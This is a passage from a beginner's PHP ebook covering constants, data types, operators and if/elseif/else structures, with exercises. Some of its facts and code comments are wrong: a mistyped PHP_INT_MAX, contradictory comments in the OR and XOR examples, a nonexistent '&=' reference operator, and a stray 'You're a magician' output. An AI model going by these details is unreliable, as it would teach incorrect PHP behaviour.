The first constant is defined using the **define()** function and is called **VAT**. Its value is set to 0.20, representing the **VAT** rate of 20%. This constant is declared globally and can be used throughout the script once defined.

 

The second constant is defined using the **const** directive and is called **AVERAGE\_GRADE**. Its value is set to 10, representing an average score. This constant is also declared globally and can be used throughout the script once defined.

 

### Advantages of using constants

 

Constants offer several advantages over variables:

 

*   **Immutable**: Constants retain their value throughout script execution, guaranteeing a constant, predictable value.
*   **Easy to read**: constants often have descriptive names that make the code easier to understand.
*   **Reusability**: Constants can be used in several places in the code without having to repeat the value.
*   **Security**: constants cannot be accidentally modified during script execution, ensuring code consistency and reliability.

 

### Best practices for naming and using constants

 

It is recommended to follow certain best practices when defining and using constants:

 

*   Use descriptive, uppercase names for constants (e.g. VAT, MAX\_SIZE).
*   Avoid using special characters or spaces in constant names.
*   Define constants at the beginning of the script for better readability.

 

### Examples of predefined constants in PHP

 

In PHP, there are a number of predefined constants that can be used in your scripts:

 

*   **PHP\_VERSION**: This predefined constant contains the current version of PHP installed on the server.
*   **PHP\_OS**: This predefined constant contains the name of the operating system running the PHP server.
*   **PHP\_INT\_MAX**: This predefined constant contains the maximum value an integer can have on the current PHP platform.
*   **\_\_FILE\_\_**: This predefined magic constant contains the absolute path of the file in which it is used.
*   **\_\_LINE\_\_**: This predefined magic constant contains the current line number in the file where it is used.

 

<?php

  
 echo PHP\_VERSION ."<br\>"; // Display current PHP version  
 echo PHP\_OS ."<br\>"; // Display operating system name  
 echo PHP\_INT\_MAX ."<br\>"; // Display the maximum value of an integer on a given platform  
 echo \_\_FILE\_\_ ."<br\>"; // Display the absolute path of the file   
 echo \_\_LINE\_\_ ."<br\>"; // Display current line number

  
?>

 

Executing this code gives you a result similar to the following output specific to our machine's data.

 

![Image](images/image-25.png)

###  

*   8.1.17 : is the PHP version installed on our computer
*   Darwin: the Mac operating system for our machine
*   92233372036854775807 : is the maximum number on the 64-bit platform
*   /Application/XAMPP/xamppfiles/htdocs/ebookphp/index.php : is the absolute path of the file currently being run
*   21 : is the line number corresponding to the echo \_\_LINE\_\_ instruction;

### Comparing variables and constants

 

Variables and constants are fundamental elements of PHP programming, but they differ in their behavior and use:

 

Variables can be modified and reassigned during script execution, while constants retain their immutable value.

Variables are declared using the **$** sign, while constants are declared using **define()** or **const**.

Constants are often used for values that remain constant throughout the script, such as tax rates or mathematical constants, while variables are used for values that may change during script execution.

## Data types in PHP

In PHP, data can be of different types, each with its own characteristics and uses. Data types in PHP can be divided into two main categories: primitive data types and complex data types. For the purposes of this first chapter, it's important to understand the different primitive data types that PHP supports. These data types are used to store different values in variables.

###  

### Primitive data types in PHP

 

Primitive data types in PHP are basic data types that represent simple values. Here are the main primitive data types in PHP :

*   Integers **(int):** Integers are used to represent whole numbers, such as -1, 0, 1, 2, etc. They can be positive or negative. They can be positive or negative. 
*   **Float** numbers **:** Float numbers are used to represent decimal numbers, such as 3.14, -0.5, 1.618 and so on.
*   **Strings**: These represent a sequence of characters enclosed in single ( ' ' ) or double ( " " ) quotation marks. For example: $name = 'John';.
*   Booleans (**bool**): These represent truth values, either **true** or **false**. For example: $is\_true = true;.
*   The **"null"** type is used to represent the absence of a value. This is different from an empty string ' ', an integer 0, or a Boolean false. In other words, the variable containing null contains no useful data or information. It's an indication that the variable is empty or has not yet been defined with a valid value.

 

To retrieve the data type of a given variable, you can use the **gettype()** function natively defined in PHP.

 

Example:

 

<?php  
 // Declaration and initialization of variables with different values  
 $age \= 30; // An integer  
 $price \= 19.99; // A floating-point number  
 $name \= 'John'; // A character string  
 $message \= "John is 20!"; // Another string  
 $is\_true \= true; // A Boolean (true)  
 $is\_false \= false; // A Boolean (false)

 $salary \= null; // No value is assigned to the variable 

  
 // Display the data type of each variable  
 echo gettype($age) . "<br\>"; // Display "integer".  
 echo gettype($price) . "<br\>"; // Display "double"  
 echo gettype($name) . "<br\>"; // Display "string"  
 echo gettype($message) . "<br\>"; // Display "string"  
 echo gettype($is\_true) . "<br\>"; // Display "boolean"  
 echo gettype($is\_false) . "<br\>"; // Display "boolean"

 echo gettype($salary) . "<br\>"; // Display "NULL".  
?>

 

The code in this example uses the **gettype()** function to get the data type of each variable, then uses **echo** to display each data type with a **<br>** tag to jump to the next line in the HTML output.

Finally, the code output will be something like this:

 

![Image](images/image-26.png)

 

Note that there are other variable types, such as arrays and objects, which are considered complex types. We'll look at these variable types in more detail in later sections of this book.

 

It's also important to note that unlike other strongly typed programming languages, where we have to explicitly declare the type of each variable, in PHP the type of a variable is determined automatically according to the value assigned to it. For example, if we declare $age = 17;, this means that the type of variable $age is an integer.

## PHP operators

PHP operators are special symbols used to perform operations on variables and values. They play an essential role in data manipulation and in controlling the execution flow of PHP scripts. Operators can be used to perform mathematical calculations, compare values, assign values to variables, concatenate strings and much more.

 

In PHP, operators are classified into different types according to their functionality: arithmetic operators, assignment operators, comparison operators, logical operators and increment/decrement operators.

In what follows, we'll explore each type of operator, explaining its use, its syntax rules and providing practical examples to illustrate how it works. Understanding operators is essential to writing efficient and functional PHP scripts.

 

### Arithmetic operators

 

Arithmetic operators are used to perform mathematical operations on numerical values. The following table illustrates the main arithmetic operators in PHP.

 

 
| Operators || Name || Example |
| --- | --- | --- |
| + || Addition || $a + $b |
| \- || Subtraction || $a - $b |
| \* || Multiplication || $a \* $b |
| / || Division || $a / $b |
| % || Modulos || $a % $b |
| \*\* || Exponentiation || $a \*\* $b |

 

**Addition (+)**: The Addition operator (+) is used to addition two or more numerical values together. For example, if you have two variables $a and $b, $a + $b will give the sum of these two variables.

 

**Subtraction (-)**: The subtraction operator (-) is used to subtract one numerical value from another. For example, if you have two variables $a and $b, $a - $b will give the difference between these two variables.

 

**Multiplication (\*)**: The multiplication operator (\*) is used to multiply two numerical values together. For example, if you have two variables $a and $b, $a \* $b will give the product of these two variables.

 

**Division (/)**: The division operator (/) is used to divide one numerical value by another. For example, if you have two variables $a and $b, $a / $b will give the quotient of the division of $a by $b.

 

**Modulo (%)**: The modulo (%) operator is used to obtain the remainder of the division of one numerical value by another. For example, if you have two variables $a and $b, $a % $b will give the remainder of the division of $a by $b.

 

**Exponentiation (\*\*):** The \*\* operator is the exponentiation operator in PHP. It is used to raise a value to a given power. For example, if you have a value $a and you want to raise it to the power $b, you can use the \*\* operator like this: $a \*\* $b. This is equivalent to raising $a to the power $b. For example, if $a is 2 and $b is 3, then $a \*\* $b will give 8, because 2 raised to the power of 3 equals 8. This operator is very useful for performing calculations involving powers in your PHP scripts.

These arithmetic operators are used in mathematical expressions to perform numerical calculations in PHP scripts. They are essential for performing a variety of mathematical operations in your programs.

 

Example:

 

<?php  
 // Declaration of variables  
 $a \= 10;  
 $b \= 3;  
  
 // Addition  
 $addition \= $a \+ $b;  
 echo "Addition : $addition <br\>";  
  
 // Subtraction  
 $subtraction \= $a \- $b;  
 echo "Subtraction : $subtraction <br\>";  
  
 // Multiplication  
 $multiplication \= $a \* $b;  
 echo "Multiplication : $multiplication <br\>";  
  
 // Division  
 $division \= $a / $b;  
 echo "Division : $division <br\>";  
  
 // Modulo  
 $modulo \= $a % $b;  
 echo "Modulo : $modulo <br\>";  
  
 // Exponentiation  
 $exponentiation \= $a \*\* $b;  
 echo "Exponentiation : $exponentiation <br\>";  
?>

 

Result:

 

![Image](images/image-27.png)

 

In this example, variables $a and $b are set to 10 and 3 respectively. Arithmetic operations are then performed with these values:

*   Adding $a and $b gives 13 (10 + 3).
*   Subtracting $b from $a gives 7 (10 - 3).
*   Multiplying $a and $b gives 30 (10 \* 3).
*   Dividing $a by $b gives approximately 3.33333 (10 / 3).
*   The modulo of $a by $b gives 1, which is the remainder of the Euclidean division of 10 by 3.
*   Finally, $a raised to the power $b gives 1000 (10 \*\* 3).

 

### Assignment operators

 

Assignment operators are used to assign values to variables. The following table illustrates the main assignment operators in PHP :

 

**Simple assignment operator (=)**: This operator is used to assign a value to a variable. 

For example, $a = 10; assigns the value 10 to variable $a.

 

**Combined assignment operators**: These operators combine an arithmetic operation with the assignment operation. 

For example, the **+=** operator additions the right-hand value to the left-hand variable and assigns the result to the left-hand variable. So $a += 5; is equivalent to $a = $a + 5;

 

**Other combined assignment operators**: Other combined assignment operators include **\-=**, **\*=**, **/=**, **%=**, **\*\*=,** which work in a similar way to subtract, multiply, divide and get the remainder respectively.

 

 
| Operators || Use || Meaning |
| --- | --- | --- |
| \= || $a = $b || Assigning the value of $b to the variable $a |
| += || $a += $b || $a = $a + $b |
| \-= || $a -= $b || $a = $a - $b |
| \*= || $a \*= $b || $a = $a \* $b |
| /= || $a /= $b || $a = $a / $b |
| %= || $a %= $b || $a = $a % $b |
| \*\*= || $a \*\*= $b || $a = $a\*\*$b |
| .= || $a .= $b || $a = $a.$b |

 

Examples:

 

<?php  
 // Simple assignment operator   
 $a = 10; // $a is now equal to 10  
 echo "\\$a after simple assignment operator: $a <br>";  
  
 // Combined assignment operators   
 $b = 5;  
 $b += 3; //Equals $b = $b + 3 and the new value of $b is 8  
 echo "\\$b after applying the += operator: $b <br>";  
  
 $c = 8;  
 $c -= 2; //Equals $c = $c - 2 and the new value of $b is 6  
 echo "\\$c after operator -= : $c <br>";  
  
 $d = 6;  
 $d \*= 4; //Equals $d = $d \* 4 and the new value of $b is 24  
 echo "\\$d after applying the \*= operator: $d <br>";  
  
 $e = 12;  
 $e /= 3; // Equals $e = $e / 3 and the new value of $b is 4  
 echo "\\$e after applying the /= operator: $e <br>";  
  
 $f = 10;  
 $f %= 3; // Equivalent to $f = $f % 3 and the new value of $b is 1  
 echo "\\$f after applying operator %= : $f <br>";  
  
?>

 

Execution of this code displays the new values of variables $a, $b, $c, $d, $e and $f after applying the corresponding operators:

 

![Image](images/image-28.png)

 

**Combined assignment operator** .**\=** This operator **is** used to concatenate a string with another existing string, then assign the result to the variable to the left of the operator.

For example, if you have a variable $message containing a string "Hello", and you want to addition "world!" to this string, you can use the **.=** operator like this:

 

<?php  
 $message \= "Hello ";  
 $message .= "world!";  
?>

 

After executing this code, the $message variable will contain the string "Hello world!".

 

**Reference assignment operator** (**&=**): This operator is used to assign the reference of one variable to another variable. This means that both variables point to the same value in memory.

 

Example:

 

<?php  
 // Reference assignment operator  
 $message1 = "Hello ";  
 $message2 = &$message1; // $message2 points to the same value as $message1  
 $message2 .= "monde !"; // Concatenates "monde !" to $message1  
  
 echo "\\$message2 after applying the &= and .= operators: $message1 <br>";  
  
 echo "\\$message1 after &= and .= operators: $message1 <br>";  
?>

 

In this example, the variable $message1 is declared and initialized with the string "Hello".

By using the reference assignment operator (**&=**), the $message2 variable is assigned the same value as the $message1 variable.

Next, the string "world!" is concatenated to the variable $message2 using the concatenation operator **.=** , which also modifies the value of $message2. But the value of $message1 is also modified, since $message1 and $message2 are linked by reference. Execution of this code produces the following result:

 

![Image](images/image-29.png)

### Comparison operators

 

Comparison operators in PHP are used to compare variable values and produce a Boolean result (true or false) based on the comparison. The following table illustrates the main comparison operators available in PHP.

 

 
| Operators || Use || Meaning |
| --- | --- | --- |
| \== || $a == $b || Checks if the values of $a and $b are equal regardless of type |
| \=== || $a === $b || Checks whether the two values are equal and of the same type |
| != || $a != $b || Checks if the two values are different regardless of type |
| <> || $a <> $b || Same role as != |
| !== || $a !== $b || Checks if two values are different **or** of different types |
| < || $a < $b || Checks if $a is less than $b |
| \> || $a > $b || Checks if $a is greater than $b |
| <= || $a <= $b || Checks if $a is less than or equal to $b |
| \>= || $a >= $b || Checks if $a is greater than or equal to $b |

 

Examples of equality operators :

 

<?php

 

 $a \= 5; 

 $b \= "5"; 

 $result \= ($a \== $b);

 echo $result;

  
?>

 

In this example, the value that will be stored in variable $result is "**true",** as variables $a and $b are equal in terms of value. If you run this code, you'll get the value 1 as the value of variable $result, which corresponds to the Boolean value **true**.

However, if you replace the (==) operator with the (===) operator, code execution will display 0, which corresponds to the Boolean value **false** of the $result variable.

 

<?php  
 $a \= 5;  
 $b \= "5";  
 $result \= ($a \=== $b);  
 echo $result;  
?>

 

Example of the difference operator :

 

<?php  
 $a \= 5;  
 $b \= 10;  
 $result \= ($a != $b);  
 echo $result;  
?>

 

Execution of this code displays the value 1, which corresponds to the Boolean value true (the value stored in the variable $result), since the variables $a and $b have different values.

 

Example of the strict difference operator ( !==) :

 

<?php  
 $a \= 5;  
 $b \= "5";  
 $result \= ($a !== $b);  
 echo $result;  
?>

 

In this code, the variable **$result** is set to **true** because the variables $a and $b have different types. In fact, $a is of type Integer and $b is of type string.

 

**Spaceship (<=>) comparison operator**: Compares two expressions. Returns - , 0 or 1 depending on whether the first expression is less than, equal to or greater than the second.

 

Example:

 

<?php

 $a \= 10; 

 $b \= 5; 

 $c \= 20; 

 $result1 \= ($a <=> $b); 

 $result2 \= ($a <=> $c);  
 echo $result1;  
 echo "<br\>";  
 echo $result2;  
?>

 

Running this code displays :

 

*   The value **1** for $result1 because the value of $a is much greater than that of $b.
*   The value **\-1** for $result2 because the value of $a is less than that of $c.

 

In summary, comparison operators in PHP are used to compare variable values and produce a Boolean result (true or false) based on the comparison. They can be used to verify equality, difference, superiority, inferiority and other comparisons between values. The main comparison operators include ==, ===, !=, <>, !==, >, <, >=, <= and <=>. They are essential for evaluating conditions and making decisions in PHP scripts.

 

### Logic operators

 

Logical operators in PHP are used to combine or invert Boolean expressions (true or false). As you'll see in the rest of this book, these operators are often used to create complex conditions by combining several logical expressions.

 

The following table illustrates the main logical operators available in PHP :

 

 
| Operators || Symbol || Use || Meaning |
| --- | --- | --- | --- |
| AND || && || $a **&&** $b || **AND**: Returns true if $a and $b are true (true) |
| OR || || || $a **||** $b || **OR**: Returns true if at least $a or $b is true. |
| XOR || XOR || $a **XOR** $b || Returns true if only $a is true or if only $b is true |
| Denial || ! || **!**$a || Returns the inverse of a boolean expression |

 

**AND operator (&& or and):** The **AND** operator returns true if all Boolean expressions combined are true.

 

*   True && True gives True
*   True && False gives False
*   False && True gives False
*   False && False gives False

 

Example:

 

<?php  
 $a \= 10 \> 2;  
 $b \= 5 < 1;  
 $result \= ($a && $b); // $result is false because $b is false  
 echo $result;  
?>

 

In this code, we have two comparison expressions:

 

**$a = 10 > 2;** : This expression compares whether 10 is greater than 2. As this is the case, $a takes the Boolean value true.

**$b = 5 < 1;** : This expression compares whether 5 is less than 1. Since this is not the case, $b takes the Boolean value false.

Then we have a third expression that uses the logical operator **&&** (AND) to combine the Boolean values of $a and $b :

$result = ($a && $b); // $result is false because $b is false

 

The && (AND) operator returns true only if both expressions combined are true. In this case, since $a is true and $b is false, $result takes the Boolean value false.

 

Finally, executing this code displays the value of $result using the echo function, which displays false because $result is false.

 

**OR operator (|| or or)**: The **OR** operator returns true if at least one of the combined Boolean expressions is true.

 

*   True || True gives True
*   True || False gives True
*   False ||True gives True
*   False || False gives False

 

Example:

 

<?php

  
 $a \= 10 \> 2;  
 $b \= 5 < 1;  
 $result \= ($a || $b); // $result is false because $b is false  
  
 echo $result;

?>

 

In this code, variables $a and $b respectively store the expressions 10 > 2 and 5 < 1 from the previous example.

However, $result = ($a || $b); uses the logical operator **||** (OR) to combine the Boolean values of $a and $b. Since $a is true and $b is false, the expression $a || $b evaluates to true. Thus, the variable $result takes the value true.

 

Execution of this code displays the value of the $result variable, which is 1 (true) because $result contains the value true.

 

**XOR (exclusive OR) operator:** is a logical operator used to evaluate Boolean expressions. XOR returns true (or 1) if one and only one of the expressions is true, but not both at the same time. If both expressions are true or false, XOR returns false (or 0).

 

In summary, XOR can be represented by the following truth table:

 

*   True XOR True gives False
*   True XOR False gives True
*   False XOR True gives True
*   False XOR False gives False

 

In programming terms, the XOR operator is often used to perform comparison operations requiring a condition where only one of the expressions must be true for the result to be true.

 

Example:

 

 // Definition of variables  
 $x \= 20;  
 $y \= 10;  
  
 // Use the XOR operator in an expression  
 $result \= ($x < 8 XOR $y \> 5);  
  
 // Display result  
 echo $result; // Display "0" (false) because both expressions are true

 

In this example, the expression $x < 8 is false because $x has a value of 20, and the expression $y > 5 is true because $y has a value of 10. Since only one of the two expressions is true, the result of the XOR operation will be true, represented by 1 in PHP.

 

**Operator ! (NOT)**: is a logical unary operator that inverts the result of a Boolean expression. It is used to negate or invert the Boolean value of an expression. Here's a summary with an example:

 

 

 

 // Definition of variables  
 $x \= 20;  
 $y \= 10;  
  
 $expression1 \= ($x \> $y);  
 $expression2 \= !$expression1;

 

 

In this code, we have two variables $x and $y which contain the values 20 and 10 respectively.

 

Next, we have an expression $expression1 that compares $x to $y using the > comparison operator. Since $x is 20 and $y is 10, the expression $x > $y will be true, so $expression1 will evaluate to true.

 

Finally, we have a second expression $expression2 which uses the **!** (NOT) operator to invert the result of $expression1. As $expression1 is true, the “ **! ” operator** converts it to false, so $expression2 will evaluate to false.

 

In short, after executing this code, $expression1 will be true and $expression2 will be false.

 

### Increment and decrement operators

 

Increment and decrement operators are used to increase or decrease the value of a numerical variable in a more concise and efficient way.

 

Increment operator "++" :

The "++" operator is used to increase the value of a numeric variable by 1.

 

Example:

 

<?php  
 $a \= 5;  
 $a++; // Equals $a = $a + 1;  
 echo $a; // Display 6  
?>

 

In this example, we have a variable $a initialized to the value 5. Next, we use the "++" increment operator on the $a variable. This operator increments the value of $a by 1.

 

So, after the $a++ operation, the value of $a becomes 6. So, if you execute this code, the new value of $a ( 6 ) is displayed as "6" on the screen.

 

In short, the $a++ operation has increased the value of $a by 1, from 5 to 6.

 

Decrement operator "--" :

The "--" operator is used to decrease the value of a numeric variable by 1.

 

Example:

 

<?php  
 $b \= 10;  
 $b--; // Equals $b = $b - 1;  
 echo $b; // Display 9  
?>

 

In this example, we have a variable $b initialized to the value 10. Next, we use the "**\--"** decrement operator on the $b variable. This operator decrements the value of $b by 1.

 

So, after the **$b--** operation, the value of $b becomes 9. So, executing this code displays the new value of $b, which is 9, using the echo function.

 

In short, the **$b--** operation decreased the value of $b by 1, from 10 to 9, and then we displayed this new value with echo.

 

ATTENTION

 

These operators can be used prefixed (before the variable) or postfixed (after the variable), and their behavior differs slightly depending on their position.

 

Example of prefixed use:

 

<?php  
 $x \= 5;  
 echo ++$x; // Display 6 (the value of $x is first increased, then displayed)  
?>

 

In this example, we have a variable $x initialized to the value 5. Next, we use the "++" increment operator prefixed (++$x) on the $x variable.

 

The prefixed increment operator (before the variable) increases the value of $x by 1, then returns this new value. So, even before display, the value of $x is increased by 1, from 5 to 6.

 

In short, the ++$x operation first increments the value of $x by 1, then displays this new value on the screen.

 

Example of suffixed use:

 

 

On the other hand, if we put the ++ operator after the variable $x, execution of the following code displays 5 (the value of $x is first displayed, then increased).

 

<?php  
 $x \= 5;  
 echo $x++; // Display 5 (the value of $x is first displayed, then increased)  
?>

 

Example:

 

<?php

  
 $x \= 5;  
 $y \= 2;  
 echo ($x++) \* ($y++);  
?>

 

In this example, we have two variables, $x initialized to 5 and $y initialized to 2. Then we use the postfix increment operator ($x++) and the postfix increment operator ($y++) to increase the values of $x and $y respectively. However, these post-fixed increment operators mean that the incrementation occurs after the evaluation of the expression in which they are used.

 

So, when evaluating the expression ($x++) \* ($y++), the values of $x and $y are used before they are incremented. This means that in this operation, $x still has the value 5 and $y still has the value 2. The operation is then expressed as (5) \* (2), giving 10 as the result.

 

After evaluating the expression, the values of $x and $y are incremented, so that $x becomes 6 and $y becomes 3.

Now compare this result with the following code:

 

<?php

  
 $x \= 5;  
 $y \= 2;  
 echo (++$x) \* (++$y);

  
?>

 

In this example, we use the prefix increment operator (++$x) and the prefix increment operator (++$y) to increase the values of $x and $y respectively. Prefix increment operators mean that incrementation occurs before the values are used in an expression.

 

So, when evaluating the expression (++$x) \* (++$y), the values of $x and $y are incremented before they are used in the expression. This means that $x becomes 6 and $y becomes 3 when the expression is evaluated. The expression is then translated as (6) \* (3), giving 18 as the result.

After evaluating the expression, the values of $x and $y remain incremented, so that $x has the value 6 and $y has the value 3.

 

Suffixed and prefixed use of the - operator

 

The decrement operator in PHP, represented by "**\--**", works on the same principle as the increment operator ++, except that it reduces the value of a variable by 1 instead of increasing it by 1. It can be used in two ways: as a prefix (--$x) or as a suffix ($x--). 

 

The prefix decrement operator (--$x) decrements the value of the variable before using it in an expression. For example, if $x is initially 5, --$x reduces its value to 4 and then returns 4.

 

The suffix decrement operator ($x--) decrements the value of the variable after using its value in an expression. For example, if $x is initially 5, $x-- first uses the value 5 in an expression, then decrements $x to 4.

## Conclusion

In this chapter, we've explored the fundamentals of PHP programming, focusing on variables, constants and operators. We learned that variables are essential elements for storing and manipulating data in a PHP program. In addition, we discovered the importance of choosing meaningful variable names and respecting good declaration and usage practices.

 

Constants, on the other hand, allow us to define immutable values that cannot be modified once defined. They are particularly useful for storing values that will not change throughout program execution.

 

Finally, we explored different types of operators in PHP, including arithmetic, logical, comparison and assignment operators. These operators enable us to perform a variety of tasks, such as mathematical calculations, logical comparisons and the manipulation of variable values.

 

By combining these concepts, PHP developers are able to create dynamic, functional programs that meet the needs of their users. In the following chapters, we'll continue to explore advanced PHP programming concepts to strengthen our understanding and skills in this powerful language.

 

## EXERCISES

 

### Exercise 1:

 

Write a PHP script that defines a name variable containing your name and an age variable containing your age. Next, the script should display a message that says: "Hello \[your name\], you're \[your age\] years old!".

 

### Exercise 2:

 

Write a PHP script that stores a person's last name, first name and age in variables and displays this information in the form of a sentence using the concatenation operator.

 

### Exercise 3:

 

Write a PHP program that stores the price of a product in a $price variable, a quantity in a $quantity variable, and calculates and displays the total amount of the order by multiplying the price by the quantity.

# Chapter 2

# Conditional structures

#  

#  

In programming, conditional structures are essential for executing blocks of code according to specific conditions. In PHP, a programming language widely used in web development, mastery of these structures is fundamental to writing efficient, functional code.

 

In this chapter, we'll explore in detail the various conditional structures available in PHP. Our aim is to provide you with a thorough understanding of these structures and to familiarize you with their practical uses. We'll look at conditional statements such as "if", "else", "elseif", "switch" and the new "match" structure introduced in recent versions of PHP. We'll also look at the ternary conditional structure to make your code more concise and readable.

 

Through a series of practical examples and use cases, you'll be able to acquire the skills you need to use these structures effectively in your own PHP projects. Whether you're a beginner or an experienced developer, this chapter will provide you with a solid foundation for mastering conditional structures in PHP and writing robust, functional code.

 

Without further ado, let's dive into the world of PHP control structures and discover how they can be used to create dynamic, high-performance web applications.

 

 

## If" structure:

The "if" structure is used to execute a block of code if a condition is evaluated as true. If the condition is false, the block of code associated with the "if" structure is ignored.

The general syntax of the if structure is :

 

![Image](images/image-30.png)

 

 

The **if** keyword is followed by a pair of parentheses **( )**.

Inside the brackets, you specify the condition you wish to evaluate. This condition can be a Boolean expression that can be true or false.

After the condition, you open a block of code between braces **{ }**. This block of code contains the instructions that will be executed if the condition is evaluated as true.

This control structure allows a block of code to be executed only if the specified condition is true. If the condition is false, the block of code is not executed.

 

Example:

 

 

<?php

 $age \= 20;  
 if ($age \>= 18) {  
 echo "You're over 18.";  
}  
?>

 

 

In this example, we have defined a variable $age with a value of 20. The if control structure checks whether the value of $age is greater than or equal to 18. If the condition is true, i.e. if the age is 18 or over, then the message "You are over 18" is displayed on the screen. Otherwise, if the condition is false (age less than 18), nothing is displayed. In the case of this example, since the value of $age is 20, executing this code will display the sentence "You're a magician".

 

![Image](images/image-31.png)

##  

## Structure if...else

The **if...else** control structure in PHP allows you to execute a block of code if a condition is true, and another block of code if the condition is false. Here's the general syntax:

 

![Image](images/image-32.png)

 

The if keyword is followed by a condition in brackets (). If the condition evaluates to true, the block of code inside braces {} following if will be executed. Otherwise, if the condition evaluates to false, the block of code inside the {} braces following else will be executed.

 

The block of code inside the {} braces after the if statement contains the instructions to be executed if the condition is true.

 

The else keyword is used to define an alternative block of code that will be executed if the if condition is false.

The block of code inside the braces {} after the else contains the instructions to be executed if the condition in the if is false.

 

Example:

 

<?php  
 $age \= 14;  
 if ($age \>= 18) {  
 echo "You're over 18.";  
 } else {  
 echo "You're a minor.";  
 }  
?>

 

In this example, if the value of the variable $age is greater than or equal to 18, the message “You’re over 18.”. Otherwise, the message "You are a minor." will be displayed. In the case of this example, since the value of $age is 14, the if condition is not verified and, consequently, the else block will be executed. Thus, code execution will display the sentence "You’re a minor.

 

![Image](images/image-33.png)

## Control structure if...elseif...else

The if...elseif...else structure lets you manage several conditions sequentially. It is useful when you need to evaluate several different cases.

This third case of conditional structures is made up of three blocks: the if block, the elseif block and the else block. Here's the syntax of this structure:

 

![Image](images/image-34.png)

 

"**if (condition1) { ... }**": We first check whether condition1 is true. If so, we execute the code within this block of instructions. It's like saying, "If this is true, do this.

 

**"elseif (condition2) { ... }"**: If condition1 is false, we go on to check condition2. If condition2 is true, we execute the code inside this block. It's like saying, "If the first thing isn't true, but this is, do this."

 

**"else { ... }**": If neither condition1 nor condition2 are true, then we execute the code inside this block. It's a kind of backup: we do it if none of the previous conditions are met.

 

In short, it's a bit like a cascade of decisions. First we check one condition, then another if the first is not met, and finally we have a last resort if none of the previous conditions is met.

 

Example:

 

<?php  
 $grade \= 75;  
  
 if ($grade \>= 90) {  
 echo "Excellent work!";  
 } elseif ($grade \>= 80) {  
 echo "Very good work!";  
 } else {  
 echo "Can do better";

  
 }  
?>

 

This code uses the **if...elseif...else** structure to evaluate the value of the variable **$grade** and display a message based on this value. Here's how it works:

 

The variable $grade is initialized with the value 75.

The program first checks whether the value of $grade is greater than or equal to 90 with the **if ($grade >= 90)** condition. As this is not the case (75 is not greater than or equal to 90), we move on to the next condition.

Next, the program checks whether the value of $grade is greater than or equal to 80 with the **elseif** condition **($grade >= 80)**. As 75 is less than 80, this condition is not met either.

Finally, the program executes the block of code inside the **else** clause, as none of the previous conditions have been met. It then displays "Can do better".

In short, this code displays "Can do better" because the value of $grade is not high enough to satisfy the conditions of the if and elseif blocks.

 

![Image](images/image-35.png)

 

Note that in PHP, you can use as many **elseif** clauses as you like after an **if** clause. This allows you to test several different conditions one after the other, until one of them is true, or until all conditions have been tested and none is true. Let's modify the previous example as follows: 

 

<?php  
  
 $grade = 64;  
  
 if ($grade >= 90) {  
 echo "Excellent work!";  
 } elseif ($grade >= 80) {  
 echo "Very good work!";  
 } elseif ($grade >= 70) {  
 echo "Good work!";  
 } elseif ($grade >= 60) {  
 echo "Average work!";  
 } elseif ($grade >= 50) {  
 echo "Can do better!";  
 } else {  
 echo "Change group";  
 }  
  
?>

 

This code evaluates the value of the variable $grade and displays a message based on this score.

*   If the score is greater than or equal to 90, the message "Excellent work!" is displayed.
*   Otherwise, if the score is greater than or equal to 80 but strictly less than 90, the message "Very good work!" is displayed.
*   Otherwise, if the score is greater than or equal to 70 but strictly less than 80, the message "Good work!" is displayed.
*   Otherwise, if the score is greater than or equal to 60 but strictly less than 70, the message "Average work!" is displayed.
*   Otherwise, if the score is greater than or equal to 50 but strictly less than 60, the message "Can do better!" is displayed.
*   Otherwise, if none of the above conditions are met (i.e. if the score is below 50), the message "Change group" is displayed.

 

In this example, the score is 64, so the message "Average work!" is displayed because this condition is the first to be met of all the conditions evaluated.

 

![Image](images/image-36.png)

 

Note that when you use several elseif statements one after the other after an initial if, the first elseif statement that evaluates to TRUE will be executed. In other words, the elseif statement is only executed if the preceding if and all preceding elseif statements are evaluated as FALSE, and your elseif statement is evaluated as TRUE. This provides a series of alternative conditions, where each elseif instruction is evaluated sequentially until a condition is met, ensuring smooth and precise control logic.

## Conditional structure and Boolean variables

If the condition to be evaluated in an if or elseif statement is a Boolean variable, the behavior is quite simple and straightforward. The Boolean variable is evaluated as true (TRUE) if it contains the value TRUE, and as false (FALSE) if it contains the value FALSE.

 

Example:

 

<?php  
 $truth = true; // Declaration of a Boolean variable with value TRUE  
 if ($truth) {  
 echo "The condition is true."; // This instruction will be executed because $truth contains the value TRUE  
 } else {  
 echo "The condition is false";  
 }  
?>

 

In this example, the Boolean variable $truth contains the value TRUE, so the condition $truth in the if statement is evaluated as TRUE, and the code inside the if block is executed, displaying "The condition is true.". If the $truth variable contained the value FALSE, then the else block would be executed, displaying "The condition is false".

 

In some cases, it makes more sense to evaluate the negation of the condition. In the previous example, if you want to test the negation of the Boolean variable $truth, you can simply use the logical negation operator (**! )** in your condition. Here's how to do it:

 

 

 

<?php

  
 $truth \= true; // Declaration of a Boolean variable with value TRUE  
  
 if (!$truth) {  
 echo "The condition is false."; // This instruction will be executed because !$truth is evaluated as FALSE

  
 } else {  
 echo "The condition is false";  
 }  
  
?>

##  

## Imbrication of conditions

Condition nesting, also known as nested conditional control structures, is a common practice in PHP programming. It consists of placing a conditional statement inside another conditional statement. A series of nested if statements can be created to handle different conditions, but this approach can quickly become complex as the number of conditions increases.

 

Here's an example of condition nesting in PHP :

 

<?php

  
 $grade \= 17;  
  
 if ($grade \>= 18) {  
 echo "Excellent work!";  
 } else {  
 if ($grade \>= 16) {  
 echo "Very good work!";  
 } else {  
 if ($grade \>= 14) {  
 echo "Good job!";  
 } else {  
 echo "Can do better!";

  
 }  
 }  
 }  
  
?>

 

 

If you run this code, you should get the following result:

 

![Image](images/image-37.png)

 

The code in this example is a series of nested **if** statements that evaluate the $grade variable to provide a message based on the student's performance.

 

*   First, the code checks whether the score is 18 or above. If so, it displays "Excellent work!
*   If the first condition is not true, this means that the score is below 18. The code then moves on to the second condition, which checks whether the grade is greater than or equal to 16. If so, it displays "Very good work!
*   If the second condition is not true either, this means that the score is below 16. The code then moves on to the third condition, which checks whether the mark is greater than or equal to 14. If so, it displays "Good work!
*   Finally, if none of the above conditions is true, the score is below 14, and the code displays "Can do better!

 

Since the value of the variable $grade is 17, the condition of the first if statement is not checked and the code moves on to the next statement.

 

The second if statement (nested in the else of the first) checks if $grade is greater than or equal to 16, which is true ($grade = 17), so this condition is satisfied and the message "Very good work!" is displayed.

